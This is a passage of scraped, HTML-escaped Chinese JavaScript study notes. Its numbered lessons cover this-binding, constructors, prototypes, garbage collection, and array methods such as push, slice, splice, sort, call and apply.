http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;debug&lt;/title&gt; &lt;script&gt; // 易错1 var a = 123; function fun() &#123; alert(a); //123 a = 456; &#125; fun(); alert(a); // 456 // 易错2 var a = 123; function fun(a) &#123; alert(a); // undefined a = 456; //函数中有a，相当于将函数中的a赋值为456，而不改变全局的a &#125; fun(); alert(a); // 123 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 061 this12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;this&lt;/title&gt; &lt;script&gt; /* 解析器在调用函数时，每次都会向函数内部传递一个隐含的参数 这个隐含的参数是this，this指向的是一个对象，这个对象我们称为函数执行的上下文对象，根据函数的调用方式的不同，this会指向不同的对象 1.以函数的形式调用时，this永远都是window 1.以方法的形式调用时，this就是调用方法的对象 */ function fun(a, b) &#123; // console.log(&quot;a = &quot; + a + &quot; b = &quot; + b); console.log(this); &#125; // fun(123, 456); var obj = &#123; name: &quot;张加林&quot;, age: 20, sayName: fun &#125; console.log(fun == obj.sayName); // true fun(); // window obj.sayName(); // obj &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 062 this补充12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;this补充&lt;/title&gt; &lt;script&gt; var name = &quot;全局&quot;; function fun() &#123; console.log(this.name); &#125; var obj = &#123; name: &quot;张加林&quot;, age: 20, sayName: fun &#125; var obj2 = &#123; name: &quot;zl&quot;, age: 21, sayName: fun &#125; fun(); // 全局 obj.sayName(); // 张加林 obj2.sayName(); // zl &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 063 使用工厂方法创建对象123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;使用工厂方法创建对象&lt;/title&gt; &lt;script&gt; /* 使用工厂方法创建对象 */ function createPerson(myName, age, gender) &#123; // 创建一个新的对象，以下为简写，本质都是new Object(); return &#123; name: myName, age: age, gender: gender, sayName: function () &#123; console.log(this.name); &#125; &#125; &#125; var obj = createPerson(&quot;张加林&quot;, 20, &quot;男&quot;); var obj2 = createPerson(&quot;zl&quot;, 21, &quot;女&quot;); console.log(obj); console.log(obj2); obj.sayName(); obj2.sayName(); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 064 构造函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;构造函数&lt;/title&gt; &lt;script&gt; /* 使用工厂方法创建的对象使用的构造函数都是Object 所以创建的对象都是Object这个类型，这就导致我们无法区分多种不同类型对象 */ /* 创建构造函数，专门用来创建Person对象的构造函数就是一个普通的函数，创建方式和普通函数没有区别， 不同的是构造函数习惯上要首字母大写 构造函数和普通函数的区别就是调用方式不同 普通函数是直接调用，而构造函数需要使用new关键字来调用 构造函数执行流程 1.立即创建一个新的对象 2.将新建的对象设置为函数中的this，在构造函数中可以使用this来引用新创建的对象 3.逐行执行函数中的代码 4.将创建的对象作为返回值返回 我们将通过一个构造函数创建的对象，称为构造函数的实例 this的情况： 1.当以函数的形式调用时，this是window 2.当以方法的形式调用时，谁调用方法，this就是谁 3.当以构造函数调用时，this就是新创建的那个对象 */ function Person(pName, age, gender) &#123; this.name = pName; this.age = age; this.gender = gender; this.sayName = function () &#123; console.log(this.name); &#125; &#125; function Dog(dName, age, gender) &#123; this.name = dName; this.age = age; this.gender = gender; this.sayName = function () &#123; console.log(this.name); &#125; &#125; var p = new Person(&quot;张加林&quot;, 20, &quot;男&quot;); var d = new Dog(&quot;小白&quot;, 3, &quot;公&quot;); console.log(p); console.log(d); /* 使用instanceof 可以检查一个对象是否是一个类的实例 语法： 对象 instanceof 构造函数 如果是，则返回true，否则返回false 所有对象都是Object的后代 所以任何对象和Object做instanceof检查都会返回true */ console.log(p instanceof Person); // true console.log(p instanceof Object); // true console.log(d instanceof Person); // false console.log(d instanceof Object); // true &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;构造函数修改&lt;/title&gt; &lt;script&gt; function Person(name, age, gender) &#123; this.name = name; this.age = age; this.gender = gender; &#125; // 向原型对象中添加sayName方法优化代码 Person.prototype.sayName = function () &#123; console.log(this.name); &#125; var p = new Person(&quot;张加林&quot;, 20, &quot;男&quot;); var p2 = new Person(&quot;zl&quot;, 21, &quot;nv&quot;); p.sayName(); p2.sayName(); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 065 构造函数修改12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;构造函数修改&lt;/title&gt; &lt;script&gt; /* 创建一个Person构造函数 在person构造函数中，为每一个对象都添加了一个sayName方法，目前我们的方法是在构造函数内部创建的，也就是构造函数每执行一次，就会创建一个新的sayName方法 也就是所有实例的sayName方法是唯一的，这样会导致构造函数每执行一次就会创建一个新的方法，这是完全没有必要的，完全可以使用所有的对象共享同一个方法 */ function Person(name, age, gender) &#123; this.name = name; this.age = age; this.gender = gender; &#125; /* 将函数定义在全局作用域，污染了全局作用域的命名空间 而且定义在全局作用域中也很不安全 */ function sayName() &#123; console.log(this.name); &#125; var p = new Person(&quot;张加林&quot;, 20, &quot;男&quot;); var p2 = new Person(&quot;zl&quot;, 21, &quot;nv&quot;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 066 原型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;原型对象prototype&lt;/title&gt; &lt;script&gt; /* 原型prototype 我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype，这个对象就是我们所谓的prototype原型对象，不同的函数有自己不同的prototype 如果函数作为普通函数调用prototype没有任何作用 当函数通过构造函数的形式调用时，他所创建的对象都会有一个隐含的属性，指向该构造函数的原型对象，可以通过__proto__来访问该属性 原型对象就相当于一个公共的区域，所有同一类的实例都可以访问到这个原型对象 我们可以将对象中共有的内容，统一设置到原型对象中 当我们访问对象中的一个属性方法时，它会先在对象自身寻找，如果有则直接使用；如果没有，则会去原型对象中寻找，如果找到则直接使用 以后我们创建构造函数时，可以将这些对象共有的属性和方法统一添加到构造函数的原型对象中，这样不用分别为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些方法和属性了 */ function Person() &#123; &#125; function MyClass() &#123; &#125; console.log(Person.prototype); console.log(MyClass.prototype); console.log(MyClass.prototype == Person.prototype); // false var mc = new MyClass(); var mc2 = new MyClass(); console.log(mc.__proto__); console.log(mc.__proto__ == MyClass.prototype); // true，说明构造函数指向的原型对象和实例对象指向的原型对象是同一个 console.log(mc.__proto__ == mc2.__proto__); // true // 向MyClass的原型中添加属性a MyClass.prototype.a = 123; console.log(mc.a); // 向mc中添加a属性 mc.a = &quot;我是mc中的中的a&quot;; // 向MyClass原型中添加一个方法 MyClass.prototype.sayHello = function () &#123; console.log(&quot;hello&quot;); &#125; mc.sayHello(); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 067 原型对象 1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;原型对象&lt;/title&gt; &lt;script&gt; /* 创建一个构造函数 */ function MyClass() &#123; &#125; // 向MyClass的原型中添加一个name属性 MyClass.prototype.name = &quot;我是原型中的名字&quot;; var mc = new MyClass(); console.log(mc.name); /* 使用in检查对象中是否含有某个属性时，对象中如果没有，但是原型中有的，也会返回true */ console.log(&quot;name&quot; in mc); // true，语法见048 // 可以使用对象的hasOwnProperty()来检查对象自身是否含有该属性，使用该方法只有当对象自身含有属性时，才会返回true console.log(mc.hasOwnProperty(&quot;name&quot;)); // false console.log(mc.hasOwnProperty(&quot;hasOwnProperty&quot;)); // false console.log(mc.__proto__.hasOwnProperty(&quot;hasOwnProperty&quot;)); // false /* 原型对象也是对象，所以它也有原型 当我在使用一个对象的属性或方法时，会先在自身中寻找 自身中如果有，则直接使用， 如果没有，则会去原型对象中寻找，如果原型对象中有则使用， 如果没有，则回去原型的原型中去寻找，直到找到Object对象的原型，而Object对象的原型没有原型，如果Object中依然没有找到，则返回undefined */ console.log(mc.__proto__.__proto__.hasOwnProperty(&quot;hasOwnProperty&quot;)); // true console.log(mc.__proto__.__proto__); // 其实就是Object对象 console.log(mc.__proto__.__proto__.__proto__); // null &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 068 toString()12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;toString()&lt;/title&gt; &lt;script&gt; /* */ function Person(name, age, gender) &#123; this.name = name; this.age = age; this.gender = gender; &#125; // 创建一个Person实例 var per = new Person(&quot;张加林&quot;, 20, &quot;男&quot;); // 当我们直接在页面中打印一个对象时，实际上输出的是对象的toString()方法的返回值 // 如果我们希望输出对象时不输出[object Object]，可以给对象添加一个toString()方法 console.log(per); console.log(per.toString()); // [object Object] console.log(per.__proto__.__proto__.hasOwnProperty(&quot;hasOwnProperty&quot;)); // true // 修改原型的toString()方法 Person.prototype.toString = function () &#123; return &quot;Person[name=&quot; + this.name + &quot;,age = &quot; + this.age + &quot;,gender=&quot; + this.gender + &quot;]&quot; &#125; console.log(per.toString()); // 你好 console.log(per); // &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 069 垃圾回收123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;垃圾回收&lt;/title&gt; &lt;script&gt; /* 垃圾回收（GC） - 就像人的生活中会产生垃圾一样，程序运行过程中也会产生垃圾，这些垃圾积攒过多，会导致程序运行过慢 所以我们需要一个垃圾回收机制，来处理程序运行过程中产生的垃圾 - 当一个对象没有任何变量或属性对它进行引用，此时我们将永远无法操作该对象，此时这种对象就是一种垃圾，这种对象过多会占用大量的内存空间，导致程序运行变缓，必须进行清理 - JS中有自动的垃圾回收机制，会自动将这些；垃圾对象从内存中销毁，我们不需要也不能进行垃圾回收的操作，不同的浏览器回收机制不同 - 我们只需要将不再使用的对象设置为null即可 */ var obj = new Object(); // 对对象进行一系列操作 obj = null; // 指针断开，堆内存会剩下对象数据，该数据成为垃圾，会被自动回收 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 070 数组1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;数组&lt;/title&gt; &lt;script&gt; /* 内建对象 宿主对象 自定义对象 数组（Array） - 数组也是一个对象 - 它和我们普通对象功能类似，也是用来存储一些值的 - 不同的是普通对象是使用字符串作为属性名，而数组是使用数字作为索引来操作元素的 - 索引： 从0开始的整数就是索引 - 数组的存储性能要优于对象，所以开发中我们经常使用数组来存储一些数据 */ //创建数组对象 var arr = new Array(); // 使用typeof检查数组，将会返回object console.log(typeof arr); console.log(arr); /* 向数组中添加元素 语法：数组[索引] = 值 */ arr[0] = 10; arr[1] = 110; arr[2] = 1110; console.log(arr); /* 读取数组中的元素 语法：数组[索引] */ console.log(arr[3]); // 读取不存在索引处的数据，返回undefined /* 获取数组的长度 可以使用length来获取数组的长度 语法：数组.length 对于连续的数组，使用length可以获取到数组的长度（元素的个数） 对于非连续的数组，使用length会获取数组的最大索引值+1 也可以使用length设置数组的长度 如果修改的length大于原长度，则多余部分会空出来 如果修改的length小于原长度，则多余的元素会被删除 */ console.log(arr.length); // 3 // arr[10] = 32; console.log(arr.length); // 11 // console.log(arr); // (11) [10, 110, 1110, 空 ×7, 32] arr.length = 10; console.log(arr); //(10) [10, 110, 1110, 空 ×7] // 向数组的最后一个位置添加元素 // 语法：数组[数组.length] = 值; arr[arr.length] = 11; console.log(arr); //(11) [10, 110, 1110, 空 ×7, 11] &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 071 数组字面量1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;数组字面量&lt;/title&gt; &lt;script&gt; /* 数组字面量 */ // 使用字面量创建一个数组 // 使用字面量创建数组，可以在创建时就指定数组中的元素 var arr = [1, 2, 3, 4, 5, 6]; console.log(typeof arr); // object /* 使用构造函数创建数组时，也可以同时添加元素，将要添加的元素作为构造函数的参数传递 元素之间使用,隔开 */ var arr2 = new Array(2, 3, 4); console.log(arr2); // 创建一个数组，元素只有1个10 arr = [10]; console.log(arr); arr2 = new Array(10); // 创建一个长度为10的数组 /* 当使用Array()创建数组时，如果只传入一个正整数参数，将创建一个长度为该正整数大小的空数组 */ console.log(arr2); // (10) [空 ×10] /* 数组中的数据类型可以是任意数据类型，包括对象，函数 */ arr = [&quot;hello&quot;, 1, null, undefined, true]; console.log(arr); arr = [function () &#123; &#125;, function () &#123; &#125;]; console.log(arr); // arr[0](); arr = [[1, 3, 4], [2, 23, 45], [3, 34, 434]]; // 二维数组 console.log(arr); console.log(arr[0][1]); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 072 数组的四个方法 1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;数组的四个方法&lt;/title&gt; &lt;script&gt; /* - push()方法 该方法可以向数组的末尾添加一个或多个元素，并返回数组新的长度 可以将要添加的元素作为方法的参数传递，这样这些元素将会自动添加到数组的末尾 */ var arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]; var length = arr.push(&quot;d&quot;, &quot;e&quot;, &quot;f&quot;); console.log(arr, length); // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;] 6 /* - pop()方法 该方法可以删除数组的最后一个元素，并将该元素作为返回值返回 */ console.log(arr.pop(), arr.length); // f 5 /* - unshift() 该方法可以向数组的开头添加一个或多个元素，并返回数组新的长度 向前插入元素后，其他元素索引会依次调整 */ length = arr.unshift(&quot;x&quot;, &quot;y&quot;, &quot;z&quot;); console.log(arr, arr.length); // [&#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;] 8 /* - shift() 删除并返回数组的第一个元素 */ console.log(arr.shift(), arr.length); // x 7 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 073 数组的遍历1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;数组的遍历&lt;/title&gt; &lt;script&gt; // 创建一个数组 var arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]; // 所谓遍历数组，就是将数组中所有的元素都取出来 for (var i = 0; i &lt; arr.length; i++) &#123; console.log(arr[i]);// 遍历 &#125; for (var i = arr.length; i &gt; 0; i--) &#123; console.log(arr[i - 1]);// 反向遍历 &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 074 练习1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;练习&lt;/title&gt; &lt;script&gt; function Person(name, age) &#123; this.name = name; this.age = age; &#125; var p = new Person(&quot;a&quot;, 8); var p1 = new Person(&quot;b&quot;, 18); var p2 = new Person(&quot;c&quot;, 28); var p3 = new Person(&quot;d&quot;, 38); var p4 = new Person(&quot;e&quot;, 15); var per = [p, p1, p2, p3, p4]; function isAdult(arr) &#123; var res = []; for (var i = 0; i &lt; arr.length; i++) &#123; if (arr[i].age &gt;= 18) res.push(arr[i]); &#125; return res; &#125; console.log(isAdult(per)); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 075 forEach1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;forEach&lt;/title&gt; &lt;script&gt; /* 一般我们都是使用for循环去遍历数组 JS中还为我们提供了一个方法，来遍历数组 forEach() - 这个方法只支持IE8以上的浏览器 IE8以下的浏览器不支持该方法，所以如果需要兼容IE8，则最好使用for循环来遍历 */ var arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;]; /* forEach() 方法需要一个函数作为参数 - 像这种函数，由我们创建但是不由我们调用的，我们称之为回调函数 - 数组中有几个元素，函数就会执行几次，每次执行时，浏览器会将遍历到的元素以实参的形式传递进来，我们可以定义形参来接收这些内容 - 浏览器会在回调函数中传递三个参数 第1个参数：当前正在遍历的元素 第2个参数：当前正在遍历元素的索引 第3个参数：当前正在遍历数组 */ arr.forEach(function (value, index, arr) &#123; console.log(value, index, arr); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 076 splice和slice1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;splice和slice&lt;/title&gt; &lt;script&gt; /* slice(start,end) - 可以用来从数组中提取指定的元素，并返回 - 该方法不会改变原数组，而是将截取到的元素封装到一个新的数组中返回 - 参数 [a,b) 1.截取开始位置的索引，包含开始索引 2.截取结束位置的索引，不包含结束索引 -结束索引可以省略不写，此时会截取从开始索引往后的所有元素 - 索引还可以传递负值，则从后往前计算 -1倒数第一个 -2倒数第二个 …… */ var arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;]; console.log(arr.slice(0, 2)); console.log(arr.slice(0, -1)); // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;] console.log(arr.slice(0, -2)); // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;] /* splice() - 可以删除数组中的指定元素 - 使用splice()方法会影响到原数组，会将指定元素从原数组中删除 并将被删除元素作为返回值返回 - 参数 第一个参数：表示开始位置的索引 第二个参数：表示删除的数量 第三个参数及其以后： 可以传递一些新的参数，这些参数会自动插入到开始位置索引前面 */ arr.splice(0, 2, &quot;替换内容1&quot;, &quot;替换内容2&quot;); // [&#x27;替换内容1&#x27;, &#x27;替换内容2&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;] console.log(arr); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 077 数组去重练习1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;练习&lt;/title&gt; &lt;script&gt; var arr = [1, 2, 3, 4, 5, 6, 3, 7, 5, 6, 4, 0, 4, 5, 6, 7, 3, 3, 5]; function deleteRepeat(a) &#123; for (var i = 0; i &lt; arr.length; i++) &#123; for (var j = i + 1; j + 1 &lt; arr.length; j++) &#123; if (arr[i] == arr[j]) &#123; arr.splice(j, 1); j--; &#125; &#125; &#125; &#125; deleteRepeat(arr); console.log(arr); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 078 数组的剩余方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;数组剩余方法&lt;/title&gt; &lt;script&gt; /* concat()可以连接连接两个或多个数组，并将新的数组返回 - 该方法不会对原数组产生影响 */ var arr1 = [1, 2, 3, 4, 5]; var arr2 = [3, 4, 5, 6, 7]; var arr3 = [31, 43, 54, 65, 72]; var res = arr1.concat(arr2, arr3, &quot;张加林&quot;, &quot;噜噜噜&quot;); console.log(res); /* join()将数组所有元素放入一个字符串，元素通过指定的分隔符进行分割 - 该方法可以将数组转换为字符串 - 该方法不会影响原数组，而是将转换后的字符串作为结果返回 - 在join()方法中可以指定一个字符串作为参数，这个字符串将会成为数组中元素的连接符；如果不使用连接符，则默认使用,作为连接符，不想有连接符可以传递空串&quot;&quot;作为参数 */ var res = arr1.join(&quot;——&quot;); console.log(res); console.log(typeof res, typeof arr1); /* reverse()颠倒数组中元素的顺序 - 该方法用于反转数组 - 该方法会直接修改原数组 */ arr1.reverse(); console.log(arr1); /* sort()：可以用来对原数组进行排序 - 会影响原数组，默认按照unicode编码进行排序 - */ arr = [&quot;d&quot;, &quot;z&quot;, &quot;c&quot;, &quot;x&quot;, &quot;e&quot;]; arr.sort(); console.log(arr); // [&#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;x&#x27;, &#x27;z&#x27;] /* 即使对于纯数字的数字，使用sort()，也会按照Unicode编码进行排序。 所以对数字进行排序时，可能会得到错误的结果； 我们可以自己指定排序规则 我们可以在sort()中添加一个回调函数，来指定排序规则 回调函数中我们需要定义两个形参，浏览器将会分别使用数组中的元素作为实参去调用回调函数 - 浏览器会根据回调函数的返回值来决定元素的位置顺序位置， 如果返回一个大于0的值，则元素将会交换位置 如果返回一个小于0的值，则位置不变 如果返回一个等于0的值，则认为两个元素相等，也不交换位置 - 如果升序排,返回a-b 如果降序排列,返回b-a */ arr = [4, 5]; arr.sort(function (a, b) &#123; console.log(a); console.log(b); &#125;); arr = [3, 5, 6, 11, 4, 2]; arr.sort();// [11, 2, 3, 4, 5, 6] arr = [3, 5, 6, 11, 4, 2]; arr.sort(function () &#123; return -1; // [2, 4, 11, 6, 5, 3]，相等于reverse // return 1; // [3, 5, 6, 11, 4, 2]，顺序不变 &#125;); arr = [3, 5, 6, 11, 4, 2]; arr.sort(function (a, b) &#123; // //从小到大排序 // if (a &gt; b) return 1; // else if (a &lt; b) return -1; // else return 0; return a - b; // 简写 &#125;); console.log(arr); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 079 call()和apply()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;call和apply&lt;/title&gt; &lt;script&gt; /* call()和apply() - 这两个方法都是函数对象的方法,需要通过函数对象来调用 - 当对函数调用call()和apply(),都会调用函数 - 在调用call()和apply()可以将对象指定一个对象为第一参数 此时这个对象将会成为函数执行时的this - call()方法可以将实参在对象之后依次传递 - apply()方法需要将实参封装到一个数组中统一传递 - this的情况: 1.以函数的形式调用时,this永远都是window 2.以方法的形式调用,this是调用方法的对象 3.以构造函数的方式调用,this是新创建对象 4.使用call和apply调用时,this是指定的对象 */ function fun() &#123; console.log(this); &#125; fun(); // window fun.call(); // window fun.apply(); // window var obj = &#123;&#125;; fun.call(obj); //obj fun.apply(obj); // obj obj = &#123; name: &quot;张加林&quot;, sayName: function () &#123; console.log(this.name); &#125; &#125;; obj2 = &#123; name: &quot;zl&quot; &#125;; obj.sayName(); // 张加林 obj.sayName.apply(obj2); //zl function fun2(a, b) &#123; console.log(a); console.log(b); &#125; fun2.call(obj, 2, 3); // 第一个参数往后,剩余的是实参 // fun2.apply(obj, 2, 3); // CreateListFromArrayLike called on non-object fun2.apply(obj, [2, 3]); // 将参数封装成数组 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 080 arguments123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;argument&lt;/title&gt; &lt;script&gt; /* 